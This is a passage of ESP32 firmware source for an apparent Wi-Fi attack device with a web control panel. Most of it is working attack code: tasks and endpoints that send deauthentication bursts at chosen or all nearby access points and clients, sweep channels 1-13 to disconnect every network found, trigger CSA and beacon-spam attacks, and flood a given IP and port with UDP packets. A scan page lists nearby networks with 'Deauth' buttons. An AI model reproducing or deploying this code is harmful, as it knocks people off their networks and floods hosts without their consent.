  vTaskDelete(NULL);
}

// ─── DEAUTH TASK ─────────────────────────────────────────────────────────────
static bool macIsZero(const uint8_t* m) {
  return !(m[0]|m[1]|m[2]|m[3]|m[4]|m[5]);
}

void deauthTask(void* param) {
  logEvent("Deauth: %02X:%02X:%02X:%02X:%02X:%02X ch%d intensity=%d",
    targetBSSID[0],targetBSSID[1],targetBSSID[2],
    targetBSSID[3],targetBSSID[4],targetBSSID[5],
    targetChannel, intensity);
  setLedState(LS_PURPLE);

  // Local copies so the loop never depends on globals being cleared mid-run
  uint8_t localBSSID[6];
  uint8_t localClient[6];
  int     localCh = targetChannel;
  int     localFrames = intensity;
  memcpy(localBSSID, targetBSSID, 6);
  memcpy(localClient, targetClient, 6);
  bool hasClient = !macIsZero(localClient);

  if (localCh < 1 || localCh > CHANNEL_MAX || macIsZero(localBSSID)) {
    logEvent("Deauth abort: bad target (ch=%d or zero BSSID)", localCh);
    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
      attackRunning = deauthRunning = stopRequested = false;
      deauthTaskHandle = NULL;
      xSemaphoreGive(attackMutex);
    }
    setLedState(LS_GREEN);
    vTaskDelete(NULL);
    return;
  }

  unsigned long cycles = 0;
  unsigned long lastHeapWarn = 0;

  // Promisc OFF for the whole attack — set_channel fails while promisc is on.
  // pausePromiscForTX does full esp_wifi_set_promiscuous(false), not just cb null.
  // Call twice: handles the race where startPromiscuous() was called between
  // the HTTP handler and this task starting.
  pausePromiscForTX();
  // Hard verify: if still reporting running (e.g. race with promisc_task restart),
  // force-kill directly. promiscPaused may be true but promiscRunning still set.
  if (promiscRunning && !promiscPaused) {
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);
    promiscPaused = true;
    ets_delay_us(5000);
  }
  // In APSTA mode the AP pins the radio to AP_CHANNEL.
  // If target is AP_CHANNEL, we're already there — no set_channel needed.
  // If different channel, log the constraint; TX still fires on AP_CHANNEL.
  if (localCh != AP_CHANNEL) {
    logEvent("NOTE: target ch%d != AP ch%d — radio stays on ch%d (APSTA limit)",
             localCh, AP_CHANNEL, AP_CHANNEL);
  }
  s_txFailLog = 0;  // reset fail counter for fresh attack

  logEvent("Deauth task RUNNING — promisc off, ch%d locked", localCh);
  while (deauthRunning && !stopRequested) {
    size_t heap = ESP.getFreeHeap();
    if (heap < HEAP_MIN && (millis() - lastHeapWarn > 8000)) {
      logEvent("HEAP LOW (%u) — still deauthing", (unsigned)heap);
      lastHeapWarn = millis();
    }

    int sent = sendDeauthBurst(localBSSID, localCh,
                    hasClient ? localClient : nullptr, localFrames);
    cycles++;
    if (cycles % 20 == 0) {
      DBG("deauth alive cycles=%lu sent=%d pkts=%lu heap=%u stack=%u",
          cycles, sent, packetsSent, (unsigned)ESP.getFreeHeap(),
          (unsigned)uxTaskGetStackHighWaterMark(NULL));
    }

    // Scale gap by intensity — keeps AP beacons alive at HIGH/MAX
    const uint32_t interBurstMs =
      (localFrames <= INTENSITY_LOW)  ?  8 :
      (localFrames <= INTENSITY_MED)  ? 15 :
      (localFrames <= INTENSITY_HIGH) ? 30 : 55;
    vTaskDelay(pdMS_TO_TICKS(interBurstMs));
  }
  logEvent("Deauth loop exited cycles=%lu deauthRunning=%d stop=%d",
           cycles, deauthRunning, stopRequested);

  resumePromiscAfterTX();
  esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
  logEvent("Deauth ended. Cycles:%lu Pkts:%lu", cycles, packetsSent);

  if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
    attackRunning = deauthRunning = stopRequested = false;
    deauthTaskHandle = NULL;
    xSemaphoreGive(attackMutex);
  }
  setLedState(LS_GREEN);
  vTaskDelete(NULL);
}

// ─── DEAUTH-ALL TASK (single-channel, AP_CHANNEL only) ───────────────────────
void deauth_all_task(void* param) {
  s_txFailLog = 0;
  logEvent("Deauth-All (AP_CHANNEL only) started");
  setLedState(LS_PURPLE);

  while (attackRunning && !stopRequested) {
    bool wasRunning = promiscRunning;
    if (wasRunning) pausePromiscForTX();
    int n = WiFi.scanNetworks(false, true, false, 120);
    if (wasRunning) resumePromiscAfterTX();

    if (n > 0) {
      for (int i = 0; i < n && !stopRequested; i++) {
        uint8_t* bssid = WiFi.BSSID(i);
        int      ch    = WiFi.channel(i);
        if (!bssid || !validateChannel(ch)) continue;
        char bstr[18];
        snprintf(bstr, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
          bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5]);
        if (isOwnAP(WiFi.SSID(i).c_str(), bstr)) continue;
        if (ch != AP_CHANNEL) continue;
        pausePromiscForTX();
        sendDeauthBurst(bssid, AP_CHANNEL, nullptr, intensity / 2 + 1);
        resumePromiscAfterTX();
        vTaskDelay(pdMS_TO_TICKS(30));
      }
    }
    WiFi.scanDelete();
    for (int i = 0; i < 12 && !stopRequested; i++)
      vTaskDelay(pdMS_TO_TICKS(100));
  }

  esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
  WiFi.scanDelete();
  logEvent("Deauth-All ended. Pkts:%lu", packetsSent);
  if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
    attackRunning = stopRequested = false;
    deauthAllTaskHandle = NULL;
    xSemaphoreGive(attackMutex);
  }
  setLedState(LS_GREEN);
  vTaskDelete(NULL);
}

// ─── DEAUTH-ALL MULTICHANNEL TASK (ch 1-13, stops AP per hop) ────────────────
// Each sweep: scan → group by channel → for each channel: stop AP, hop, blast,
// restart AP. Control UI flickers ~300ms per channel. JS auto-reconnects.
// Targets cached in PSRAM (psramTargets[]). Falls back to heap if PSRAM absent.
void deauth_all_ch_task(void* param) {
  s_txFailLog = 0;
  logEvent("Deauth-All MULTICHANNEL ch1-13 started");
  setLedState(LS_PURPLE);

  String apSSID = prefs.getString("ap_ssid", AP_SSID_DEFAULT);
  String apPass = prefs.getString("ap_pass", AP_PASS_DEFAULT);

  // Allocate target buffer — prefer PSRAM, fall back to heap
  DeauthTarget* targets = psramAvailable
    ? psramTargets
    : (DeauthTarget*)malloc(sizeof(DeauthTarget) * MAX_PSRAM_TARGETS);

  if (!targets) {
    logEvent("ALLOC FAIL — multichannel deauth aborted");
    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
      attackRunning = stopRequested = false;
      deauthAllChHandle = NULL;
      xSemaphoreGive(attackMutex);
    }
    setLedState(LS_GREEN);
    vTaskDelete(NULL);
    return;
  }

  while (attackRunning && !stopRequested) {
    int targetCount = 0;

    // ── Phase 1: Stop AP, scan all channels ─────────────────────────────────
    stopPromiscuous();
    WiFi.softAPdisconnect(false);
    vTaskDelay(pdMS_TO_TICKS(150));

    int n = WiFi.scanNetworks(false, true, false, 150);
    if (n > 0) {
      for (int i = 0; i < n && targetCount < MAX_PSRAM_TARGETS; i++) {
        uint8_t* bssid = WiFi.BSSID(i);
        int      ch    = WiFi.channel(i);
        if (!bssid || !validateChannel(ch)) continue;
        char bstr[18];
        snprintf(bstr, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
          bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5]);
        if (isOwnAP(WiFi.SSID(i).c_str(), bstr)) continue;
        memcpy(targets[targetCount].bssid, bssid, 6);
        targets[targetCount].ch = (uint8_t)ch;
        targetCount++;
      }
    }
    WiFi.scanDelete();

    logEvent("Multichannel: %d targets found across ch1-13", targetCount);

    // ── Phase 2: Per-channel hop, blast, back to AP ──────────────────────────
    for (int ch = 1; ch <= CHANNEL_MAX && !stopRequested; ch++) {
      // Collect targets on this channel
      bool any = false;
      for (int i = 0; i < targetCount; i++)
        if (targets[i].ch == ch) { any = true; break; }
      if (!any) continue;

      // Hop to channel (AP is already stopped)
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      vTaskDelay(pdMS_TO_TICKS(8));

      // Blast all targets on this channel
      for (int i = 0; i < targetCount && !stopRequested; i++) {
        if (targets[i].ch != ch) continue;
        int frames = (intensity / 2) + 1;
        sendDeauthBurst(targets[i].bssid, ch, nullptr, frames);
        vTaskDelay(pdMS_TO_TICKS(8));
      }
    }

    // ── Phase 3: Restart AP on AP_CHANNEL ───────────────────────────────────
    esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(50));
    WiFi.softAP(apSSID.c_str(), apPass.c_str(), AP_CHANNEL, 0, 4);
    WiFi.softAPmacAddress(ownBSSIDap);
    boostTxPower();
    startPromiscuous();
    vTaskDelay(pdMS_TO_TICKS(200));

    logEvent("Multichannel sweep done — AP back. Pkts:%lu", packetsSent);

    // Pause between sweeps
    for (int i = 0; i < 30 && !stopRequested; i++)
      vTaskDelay(pdMS_TO_TICKS(100));
  }

  // Cleanup: ensure AP is back up
  esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
  WiFi.softAP(apSSID.c_str(), apPass.c_str(), AP_CHANNEL, 0, 4);
  WiFi.softAPmacAddress(ownBSSIDap);
  boostTxPower();
  startPromiscuous();

  if (!psramAvailable && targets) free(targets);

  logEvent("Deauth-All MULTICHANNEL ended. Pkts:%lu", packetsSent);
  if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
    attackRunning = stopRequested = false;
    deauthAllChHandle = NULL;
    xSemaphoreGive(attackMutex);
  }
  setLedState(LS_GREEN);
  vTaskDelete(NULL);
}

// ─── UDP FLOOD ───────────────────────────────────────────────────────────────
void udp_flood_task(void* param) {
  logEvent("UDP flood: %s:%d", targetIP.c_str(), targetPort);
  setLedState(LS_PURPLE);

  WiFiUDP udp;
  uint8_t pkt[1024];
  unsigned long count = 0;

  while (attackRunning && !stopRequested) {
    if (ESP.getFreeHeap() < HEAP_MIN) { logEvent("HEAP CRITICAL — UDP stopped"); break; }
    esp_fill_random(pkt, sizeof(pkt));  // randomize payload every packet
    if (udp.beginPacket(targetIP.c_str(), targetPort)) {
      udp.write(pkt, sizeof(pkt));
      if (udp.endPacket()) {
        incrementPackets(1);
        count++;
      }
    }
    vTaskDelay(1);
  }

  logEvent("UDP ended. Pkts:%lu", count);
  if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
    attackRunning = stopRequested = false;
    udpTaskHandle = NULL;
    xSemaphoreGive(attackMutex);
  }
  setLedState(LS_GREEN);
  vTaskDelete(NULL);
}

// ─── STOP ALL ────────────────────────────────────────────────────────────────
void stopAllAttacks() {
  if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
    stopRequested = true;
    xSemaphoreGive(attackMutex);
  }

  // Grace period — let tasks self-terminate
  unsigned long t0 = millis();
  while ((deauthTaskHandle || udpTaskHandle || deauthAllTaskHandle ||
          deauthAllChHandle  || beaconTaskHandle || csaTaskHandle) && millis() - t0 < 2500) {
    delay(30);
  }

  // Force-kill any survivors
  if (deauthTaskHandle)    { vTaskDelete(deauthTaskHandle);    deauthTaskHandle    = NULL; }
  if (udpTaskHandle)       { vTaskDelete(udpTaskHandle);       udpTaskHandle       = NULL; }
  if (deauthAllTaskHandle) { vTaskDelete(deauthAllTaskHandle); deauthAllTaskHandle = NULL; }
  if (deauthAllChHandle)   { vTaskDelete(deauthAllChHandle);   deauthAllChHandle   = NULL; }
  if (beaconTaskHandle)    { vTaskDelete(beaconTaskHandle);    beaconTaskHandle    = NULL; }
  if (csaTaskHandle)       { vTaskDelete(csaTaskHandle);       csaTaskHandle       = NULL; }

  resumePromiscAfterTX();

  if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
    attackRunning = deauthRunning = stopRequested = false;
    xSemaphoreGive(attackMutex);
  }

  esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
  setLedState(LS_GREEN);
  logEvent("All attacks stopped");
}

// ─── AUTH ─────────────────────────────────────────────────────────────────────
bool authOk(AsyncWebServerRequest* r) {
  if (apiKey.length() == 0) return true;
  if (r->hasParam("key")     && r->getParam("key")->value()     == apiKey) return true;
  if (r->hasParam("api_key") && r->getParam("api_key")->value() == apiKey) return true;
  if (r->hasHeader("X-API-Key") && r->getHeader("X-API-Key")->value() == apiKey) return true;
  r->send(401, "text/plain", "Unauthorized");
  return false;
}

// ─── WIFI SCAN ───────────────────────────────────────────────────────────────
static String htmlEncode(const String& s) {
  String o; o.reserve(s.length() + 8);
  for (char c : s) {
    if      (c == '<')  o += "&lt;";
    else if (c == '>')  o += "&gt;";
    else if (c == '&')  o += "&amp;";
    else if (c == '"')  o += "&quot;";
    else if (c == '\'') o += "&#39;";
    else                o += c;
  }
  return o;
}

String performWiFiScan() {
  bool was = promiscRunning;
  if (was) stopPromiscuous();

  int n = WiFi.scanNetworks(false, true, false, 150);

  if (was) startPromiscuous();

  if (n <= 0) {
    WiFi.scanDelete();
    return "<tr><td colspan='7' style='text-align:center;color:#666;padding:20px'>"
           "No networks found</td></tr>";
  }

  String out;
  for (int i = 0; i < n; i++) {
    uint8_t* bssid = WiFi.BSSID(i);
    char bstr[18];
    snprintf(bstr, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
      bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5]);

    String ssid = WiFi.SSID(i);
    if (isOwnAP(ssid.c_str(), bstr)) continue;

    int    rssi  = WiFi.RSSI(i);
    int    ch    = WiFi.channel(i);
    String col   = rssi > -50 ? "#0f9d58" : (rssi > -70 ? "#f4b400" : "#db4437");
    String bars  = rssi > -50 ? "▮▮▮▮" : (rssi > -60 ? "▮▮▮" : (rssi > -70 ? "▮▮" : "▮"));
    String sec   = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "Open" : "WPA";
    String disp  = ssid.length() ? htmlEncode(ssid) : "<i style='color:#888'>[Hidden]</i>";

    out +=
      "<tr><td>" + String(i+1) + "</td>"
      "<td>" + disp + "</td>"
      "<td style='font-size:10px;font-family:monospace'>" + String(bstr) + "</td>"
      "<td>" + ch + "</td>"
      "<td style='color:" + col + "'>" + rssi + " " + bars + "</td>"
      "<td>" + sec + "</td>"
      "<td style='white-space:nowrap'>"
        "<button class='btn-sel' onclick=\"selTarget('" + String(bstr) + "',"
          + ch + ",'" + jsEscape(ssid) + "')\">Deauth</button> "
        "<button class='btn-csa' onclick=\"selCSA('" + String(bstr) + "',"
          + ch + ",'" + jsEscape(ssid) + "')\">CSA</button>"
      "</td></tr>";
  }
  WiFi.scanDelete();
  return out;
}

String performClientScan() {
  if (!clientsMutex)
    return "<tr><td colspan='5' style='text-align:center;color:#db4437;padding:12px'>"
           "Mutex not ready</td></tr>";
  if (xSemaphoreTake(clientsMutex, pdMS_TO_TICKS(200)) != pdTRUE)
    return "<tr><td colspan='5' style='text-align:center;color:#db4437;padding:12px'>"
           "Mutex timeout</td></tr>";

  if (numClients == 0) {
    xSemaphoreGive(clientsMutex);
    return "<tr><td colspan='5' style='text-align:center;color:#888;padding:20px'>"
           "No clients sniffed yet — passive scanning active...</td></tr>";
  }

  const unsigned long now = millis();
  String out; int shown = 0;

  for (int i = 0; i < numClients; i++) {
    if ((now - clients[i].lastSeen) > PROMISC_MAX_AGE) continue;
    char mstr[18];
    snprintf(mstr, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
      clients[i].mac[0],clients[i].mac[1],clients[i].mac[2],
      clients[i].mac[3],clients[i].mac[4],clients[i].mac[5]);

    out +=
      "<tr>"
      "<td style='font-size:10px;font-family:monospace'>" + String(mstr) + "</td>"
      "<td>" + clients[i].rssi + " dBm</td>"
      "<td>" + clients[i].channel + "</td>"
      "<td>" + String((now - clients[i].lastSeen)/1000) + "s ago</td>"
      "<td><button class='btn-sel' onclick=\""
        "document.getElementById('clientInput').value='" + String(mstr) + "';"
        "document.getElementById('clientInput').style.borderColor='#db4437'"
        "\">Target</button></td>"
      "</tr>";
    shown++;
  }

  xSemaphoreGive(clientsMutex);
  if (!shown) return
    "<tr><td colspan='5' style='text-align:center;color:#888;padding:20px'>"
    "All entries stale</td></tr>";
  return out;
}

// ─── WEB SERVER ──────────────────────────────────────────────────────────────
void setupServer() {

  server.on("/", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->send_P(200, "text/html", INDEX_HTML);
  });

  server.on("/scan", HTTP_GET, [](AsyncWebServerRequest* r) {
    logEvent("HIT /scan");
    r->send(200, "text/html", performWiFiScan());
  });

  server.on("/scan_clients", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->send(200, "text/html", performClientScan());
  });

  // ── /deauth ───────────────────────────────────────────────────────────────
  server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest* r) {
    logEvent("HIT /deauth from client");
    if (!authOk(r)) { logEvent("/deauth REJECT auth"); return; }
    if (!r->hasParam("bssid") || !r->hasParam("ch")) {
      logEvent("/deauth missing bssid/ch");
      r->send(400, "text/plain", "ERROR: bssid+ch required"); return;
    }
    String bstr = r->getParam("bssid")->value();
    int    ch   = r->getParam("ch")->value().toInt();
    if (!validateMAC(bstr))   { r->send(400,"text/plain","ERROR: Bad BSSID");   return; }
    if (!validateChannel(ch)) { r->send(400,"text/plain","ERROR: Bad channel"); return; }
    if (!parseMAC(bstr, targetBSSID)) { r->send(400,"text/plain","ERROR: MAC parse"); return; }
    if (isOwnAP(NULL, bstr.c_str())) { r->send(403,"text/plain","ERROR: Own AP");    return; }

    memset(targetClient, 0, 6);
    if (r->hasParam("client")) {
      String cs = r->getParam("client")->value();
      if (cs.length() > 0 && !parseMAC(cs, targetClient)) {
        r->send(400,"text/plain","ERROR: Bad client MAC"); return;
      }
    }
    if (r->hasParam("ssid"))  targetSSID = r->getParam("ssid")->value();
    if (r->hasParam("inten")) {
      int v = r->getParam("inten")->value().toInt();
      if      (v == 1) intensity = INTENSITY_LOW;
      else if (v == 2) intensity = INTENSITY_MED;
      else if (v == 3) intensity = INTENSITY_HIGH;
      else if (v == 4) intensity = INTENSITY_MAX;
    }
    targetChannel = ch;

    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) != pdTRUE) {
      r->send(503,"text/plain","ERROR: Mutex timeout"); return;
    }
    if (deauthRunning) {
      xSemaphoreGive(attackMutex);
      r->send(409,"text/plain","ERROR: Already running"); return;
    }
    deauthRunning = attackRunning = true;
    stopRequested = false;
    packetsSent = 0;
    xSemaphoreGive(attackMutex);

    // Stop promisc NOW in the HTTP task — before the deauth task even exists.
    // This eliminates the race where the deauth task calls pausePromiscForTX()
    // after startPromiscuous() has restarted the sniffer between /scan and /deauth.
    pausePromiscForTX();

    BaseType_t ok = xTaskCreatePinnedToCore(deauthTask, "deauth", 10240, NULL, 3,
                            &deauthTaskHandle, 0);
    if (ok != pdPASS) {
      logEvent("FAILED to create deauth task");
      deauthRunning = attackRunning = false;
      deauthTaskHandle = NULL;
      setLedState(LS_GREEN);
      r->send(500, "text/plain", "ERROR: task create failed");
      return;
    }
    logEvent("Deauth task created OK handle=%p", (void*)deauthTaskHandle);
    r->send(200,"text/plain","OK");
  });

  // ── /csa ──────────────────────────────────────────────────────────────────
  server.on("/csa", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (!r->hasParam("bssid") || !r->hasParam("ch")) {
      r->send(400,"text/plain","ERROR: bssid+ch required"); return;
    }
    String bstr = r->getParam("bssid")->value();
    int    ch   = r->getParam("ch")->value().toInt();
    if (!validateMAC(bstr) || !parseMAC(bstr, targetBSSID)) {
      r->send(400,"text/plain","ERROR: Bad BSSID"); return;
    }
    if (!validateChannel(ch))         { r->send(400,"text/plain","ERROR: Bad channel"); return; }
    if (isOwnAP(NULL, bstr.c_str())) { r->send(403,"text/plain","ERROR: Own AP");      return; }

    if (r->hasParam("ssid")) targetSSID = r->getParam("ssid")->value();
    targetChannel = ch;

    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) != pdTRUE) {
      r->send(503,"text/plain","ERROR: Mutex timeout"); return;
    }
    if (attackRunning) {
      xSemaphoreGive(attackMutex);
      r->send(409,"text/plain","ERROR: Attack running"); return;
    }
    attackRunning = true; stopRequested = false; packetsSent = 0;
    xSemaphoreGive(attackMutex);

    xTaskCreatePinnedToCore(csa_task, "csa", 4096, NULL, 3, &csaTaskHandle, 0);
    r->send(200,"text/plain","CSA started");
  });

  // ── /beacon_spam ──────────────────────────────────────────────────────────
  server.on("/beacon_spam", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) != pdTRUE) {
      r->send(503,"text/plain","ERROR: Mutex timeout"); return;
    }
    if (attackRunning) {
      xSemaphoreGive(attackMutex);
      r->send(409,"text/plain","ERROR: Attack running"); return;
    }
    attackRunning = true; stopRequested = false; packetsSent = 0;
    xSemaphoreGive(attackMutex);

    xTaskCreatePinnedToCore(beacon_spam_task, "beacon", 4096, NULL, 2,
                            &beaconTaskHandle, 0);
    r->send(200,"text/plain","Beacon spam started");
  });

  // ── /deauth_all_ch — multi-channel ch1-13 (stops AP briefly per hop) ─────
  server.on("/deauth_all_ch", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (r->hasParam("inten")) {
      int v = r->getParam("inten")->value().toInt();
      if      (v == 1) intensity = INTENSITY_LOW;
      else if (v == 2) intensity = INTENSITY_MED;
      else if (v == 3) intensity = INTENSITY_HIGH;
      else if (v == 4) intensity = INTENSITY_MAX;
    }
    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) != pdTRUE) {
      r->send(503,"text/plain","ERROR: Mutex timeout"); return;
    }
    if (attackRunning) {
      xSemaphoreGive(attackMutex);
      r->send(409,"text/plain","ERROR: Attack running"); return;
    }
    attackRunning = true; stopRequested = false; packetsSent = 0;
    xSemaphoreGive(attackMutex);
    xTaskCreatePinnedToCore(deauth_all_ch_task, "dallch", 10240, NULL, 2,
                            &deauthAllChHandle, 0);
    r->send(200,"text/plain","Deauth-All MULTICHANNEL ch1-13 started");
  });

  // ── /deauth_all ───────────────────────────────────────────────────────────
  server.on("/deauth_all", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (r->hasParam("inten")) {
      int v = r->getParam("inten")->value().toInt();
      if      (v == 1) intensity = INTENSITY_LOW;
      else if (v == 2) intensity = INTENSITY_MED;
      else if (v == 3) intensity = INTENSITY_HIGH;
      else if (v == 4) intensity = INTENSITY_MAX;
    }
    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) != pdTRUE) {
      r->send(503,"text/plain","ERROR: Mutex timeout"); return;
    }
    if (attackRunning) {
      xSemaphoreGive(attackMutex);
      r->send(409,"text/plain","ERROR: Attack running"); return;
    }
    attackRunning = true; stopRequested = false; packetsSent = 0;
    xSemaphoreGive(attackMutex);

    xTaskCreatePinnedToCore(deauth_all_task, "dall", 8192, NULL, 2,
                            &deauthAllTaskHandle, 0);
    r->send(200,"text/plain","Deauth-All started");
  });

  // ── /stop ─────────────────────────────────────────────────────────────────
  server.on("/stop", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    stopAllAttacks();
    r->send(200,"text/plain","Stopped");
  });

  server.on("/stopdeauth", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    deauthRunning = false;
    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
      stopRequested = true; xSemaphoreGive(attackMutex);
    }
    r->send(200,"text/plain","Deauth stop requested");
  });

  // ── /udp_flood ────────────────────────────────────────────────────────────
  server.on("/udp_flood", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (!r->hasParam("ip") || !r->hasParam("port")) {
      r->send(400,"text/plain","ERROR: ip+port required"); return;
    }
    String ip   = r->getParam("ip")->value();
    int    port = r->getParam("port")->value().toInt();
    if (!validateIP(ip))    { r->send(400,"text/plain","ERROR: Bad IP");   return; }
    if (!validatePort(port)){ r->send(400,"text/plain","ERROR: Bad port"); return; }

    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) != pdTRUE) {
      r->send(503,"text/plain","ERROR: Mutex timeout"); return;
    }
    if (attackRunning) {
      xSemaphoreGive(attackMutex);
      r->send(409,"text/plain","ERROR: Attack running"); return;
    }
    targetIP = ip; targetPort = port;
    attackRunning = true; stopRequested = false; packetsSent = 0;
    xSemaphoreGive(attackMutex);

    xTaskCreatePinnedToCore(udp_flood_task, "udp", 8192, NULL, 2,
                            &udpTaskHandle, 0);
    r->send(200,"text/plain","UDP flood started");
  });

  // ── STA config ────────────────────────────────────────────────────────────
  server.on("/savesta", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (!r->hasParam("ssid") || !r->hasParam("pass")) {
      r->send(400,"text/plain","ERROR: ssid+pass required"); return;
    }
    String ss = r->getParam("ssid")->value();
    String pp = r->getParam("pass")->value();
    if (ss.length() > 32 || pp.length() > 63) {
      r->send(400,"text/plain","ERROR: Input too long"); return;
    }
    prefs.putString("client_ssid", ss);
    prefs.putString("client_pass", pp);
    ss.toCharArray(client_ssid, 64);
    pp.toCharArray(client_pass, 64);
    WiFi.begin(client_ssid, client_pass);
    logEvent("STA connecting: %s", client_ssid);
    r->send(200,"text/plain","Saved & connecting...");
  });

  // ── AP rename ─────────────────────────────────────────────────────────────
  server.on("/setap", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (!r->hasParam("ssid") || !r->hasParam("pass")) {
      r->send(400,"text/plain","ERROR: ssid+pass required"); return;
    }
    String ss = r->getParam("ssid")->value();
    String pp = r->getParam("pass")->value();
    if (ss.length() < 1 || ss.length() > 32) {
      r->send(400,"text/plain","ERROR: SSID 1-32 chars"); return;
    }
    if (pp.length() < 8 || pp.length() > 63) {
      r->send(400,"text/plain","ERROR: Pass 8-63 chars"); return;
    }
    prefs.putString("ap_ssid", ss);
    prefs.putString("ap_pass", pp);
    if (WiFi.softAP(ss.c_str(), pp.c_str(), AP_CHANNEL)) {
      WiFi.softAPmacAddress(ownBSSIDap);
      logEvent("AP renamed: %s", ss.c_str());
      r->send(200,"text/plain","AP updated. Reconnect to: " + ss);
    } else {
      r->send(500,"text/plain","ERROR: softAP restart failed");
    }
  });

  // ── Polling endpoints ─────────────────────────────────────────────────────
  server.on("/pkt_count", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->send(200,"text/plain", String(packetsSent));
  });

  server.on("/attack_status", HTTP_GET, [](AsyncWebServerRequest* r) {
    String type = "idle";
    if      (deauthAllChHandle)  type = "deauthallch";
    else if (deauthAllTaskHandle) type = "deauthall";
    else if (deauthRunning)       type = "deauth";
    else if (udpTaskHandle)       type = "udpflood";
    else if (beaconTaskHandle)    type = "beacon";
    else if (csaTaskHandle)       type = "csa";
    r->send(200,"text/plain",
      String(attackRunning ? 1 : 0) + "," + type + "," + String(packetsSent));
  });

  // ── Event log ─────────────────────────────────────────────────────────────
  server.on("/log", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!logMutex) { r->send(200,"text/plain","(not ready)"); return; }
    if (xSemaphoreTake(logMutex, pdMS_TO_TICKS(200)) != pdTRUE) {
      r->send(200,"text/plain","(mutex timeout)"); return;
    }
    String out;
    int total = min(logCount, LOG_MAX);
    int start = (logCount >= LOG_MAX) ? logHead : 0;
    char line[100];
    for (int i = 0; i < total; i++) {
      int idx = (start + i) % LOG_MAX;
      snprintf(line, 100, "[%lus] %s\n", logBuf[idx].ts/1000, logBuf[idx].msg);
      out += line;
    }
    xSemaphoreGive(logMutex);
    r->send(200,"text/plain", out);
  });

  // ── System status ─────────────────────────────────────────────────────────
  server.on("/sysinfo", HTTP_GET, [](AsyncWebServerRequest* r) {
    String staIP   = client_connected ? WiFi.localIP().toString() : "—";
    int    staRSSI = client_connected ? WiFi.RSSI() : 0;
    String apSSID  = prefs.getString("ap_ssid", AP_SSID_DEFAULT);

    const char* intenLabel =
      (intensity == INTENSITY_LOW)  ? "LOW"  :
      (intensity == INTENSITY_MED)  ? "MED"  :
      (intensity == INTENSITY_HIGH) ? "HIGH" : "MAX";

    char bstr[18];
    snprintf(bstr, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
      ownBSSIDap[0],ownBSSIDap[1],ownBSSIDap[2],
      ownBSSIDap[3],ownBSSIDap[4],ownBSSIDap[5]);

    String info = "<div class='stats'>";
    auto S = [&](const char* l, String v) {
      info += "<div class='stat'><div class='stat-l'>" + String(l)
            + "</div><div class='stat-v'>" + v + "</div></div>";
    };
    S("Uptime",    String(millis()/1000) + "s");
    S("Free Heap", String(ESP.getFreeHeap()/1024) + "K");
    S("AP Clients",String(WiFi.softAPgetStationNum()));
    S("Status",    attackRunning
        ? "<span style='color:#a855f7;font-weight:800'>ACTIVE</span>"
        : "IDLE");
    S("Packets",   String(packetsSent));
    S("CPU",       String(ESP.getCpuFreqMHz()) + "MHz");
    S("STA IP",    staIP);
    S("STA RSSI",  client_connected ? String(staRSSI)+" dBm" : "—");
    S("AP SSID",   apSSID);
    S("AP BSSID",  String(bstr));
    S("Intensity", String(intenLabel));
    S("MAC Rand",  macRandEnabled ? "ON" : "OFF");
    info += "</div>";
    r->send(200,"text/html", info);
  });

  // ── Runtime config ────────────────────────────────────────────────────────
  server.on("/set", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (r->hasParam("inten")) {
      int v = r->getParam("inten")->value().toInt();
      if      (v == 1) intensity = INTENSITY_LOW;
      else if (v == 2) intensity = INTENSITY_MED;
      else if (v == 3) intensity = INTENSITY_HIGH;
      else if (v == 4) intensity = INTENSITY_MAX;
    }
    if (r->hasParam("mac_rand"))
